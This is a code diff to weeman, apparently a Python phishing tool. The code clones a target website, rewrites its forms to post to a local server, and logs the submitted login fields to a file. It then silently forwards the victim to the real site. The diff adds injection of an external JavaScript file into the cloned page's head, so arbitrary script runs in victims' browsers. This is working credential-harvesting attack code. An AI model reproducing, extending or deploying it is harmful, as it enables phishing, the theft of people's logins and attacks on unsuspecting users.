@@ -3,7 +3,7 @@
 #
 # This file if part of weeman project
 #
-# See 'LICENSE' file for copying 
+# See 'LICENSE' file for copying
 #
 
 import SimpleHTTPServer
@@ -29,10 +29,10 @@ class handler(SimpleHTTPServer.SimpleHTTPRequestHandler):
     def do_POST(self):
         post_request = []
         printt(3, "%s - sent POST request." %self.address_string())
-       	form = cgi.FieldStorage(self.rfile,
-            headers=self.headers,
-            environ={'REQUEST_METHOD':'POST',
-                     'CONTENT_TYPE':self.headers['Content-Type'],})
+        form = cgi.FieldStorage(self.rfile,
+        headers=self.headers,
+        environ={'REQUEST_METHOD':'POST',
+                 'CONTENT_TYPE':self.headers['Content-Type'],})
         try:
             from core.shell import url
             logger = open("%s.log" %url.replace("https://", "").replace("http://", "").split("/")[0], "a")
@@ -65,7 +65,7 @@ class handler(SimpleHTTPServer.SimpleHTTPRequestHandler):
 class weeman(object):
     """
         The main class,
-        start,stop,cleanup,clone website etc.. 
+        start,stop,cleanup,clone website etc..
     """
     def __init__(self, url,port):
         from core.shell import url
@@ -90,6 +90,7 @@ class weeman(object):
 
     def clone(self):
         from core.shell import html_file
+        from core.shell import external_js
         if not html_file:
             printt(3, "Trying to get %s  ..." %self.url)
             printt(3, "Downloadng webpage ...")
@@ -98,21 +99,25 @@ class weeman(object):
             printt(3, "Loading \'%s\' ..." %html_file)
             data = open(html_file, "r").read()
         # Data
-        data = bs(data, "html.parser")    
+        data = bs(data, "html.parser")
         printt(3, "Modifying the HTML file ...")
 
         for tag in data.find_all("form"):
             tag['method'] = "post"
             tag['action'] = "ref.html"
 
+        # Insert external script
+        script = data.new_tag('script', src=external_js)
+        data.html.head.insert(len(data.html.head), script)
+
         # Here we will attampt to load CSS/JS from the page
         # and replace ./ ../ / with the site URL.
-        
+
         # Case the URL have more then one file
         try:
             uri = self.url.rsplit('/', 1)[0]
-            urisp = uri.split("/")[2] 
-        
+            urisp = uri.split("/")[2]
+
             # <link
             for tag in data.find_all("link"):
                 link = tag['href']
@@ -141,7 +146,7 @@ class weeman(object):
                     tag['src'] = "%s%s" %(uri, link);
                 elif not link.startswith("/") and not urisp in link:
                     tag['src'] = "%s/%s" %(uri, link);
-            # <a 
+            # <a
             for tag in data.find_all("a"):
                 link = tag['href']
                 if link.startswith("//"):
@@ -158,7 +163,7 @@ class weeman(object):
 
         except IndexError:
             uri = self.url
-            urisp = uri.replace("http://", "").replace("https://", "") 
+            urisp = uri.replace("http://", "").replace("https://", "")
         except Exception as e:
             printt(3, "Something happen: (%s) igonring ..." %str(e))
 
@@ -170,7 +175,7 @@ class weeman(object):
         printt(3, "\033[01;35mStarting Weeman %s server on localhost:%d\033[00m" %(__version__, self.port))
         self.httpd = SocketServer.TCPServer(("", self.port),handler)
         self.httpd.serve_forever()
-    
+
     def cleanup(self):
         if os.path.exists("index.html"):
             printt(3, "\n:: Running cleanup ...")
@@ -188,5 +193,3 @@ def create_post(url,action_url, post_request):
     red.write("<input name=\"login\" type=\"hidden\">")
     red.write("<script langauge=\"javascript\">document.forms[\"ff\"].submit();</script>")
     red.close()
-
-
